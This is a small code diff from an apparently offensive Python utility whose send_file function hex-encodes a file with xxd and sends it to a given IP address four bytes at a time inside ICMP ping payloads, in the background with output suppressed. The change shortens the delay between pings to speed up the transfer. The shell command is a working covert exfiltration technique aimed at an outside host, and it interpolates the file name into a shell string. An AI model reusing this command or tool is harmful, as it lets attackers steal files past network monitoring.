@@ -69,7 +69,7 @@ def send_file(ip_address, file_name):
               f"{Fore.RED + ' Indicate file dosent exist, check file name.'}")
         print(Fore.WHITE)  # To avoid leaving the terminal with colours.
         exit()
-    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .01s; done >/dev/null 2>&1 &"""
+    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .001s; done >/dev/null 2>&1 &"""
     print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
           f"{Fore.BLUE + '  Trying to send file..'}")
     subprocess.run([file_load], shell=True)
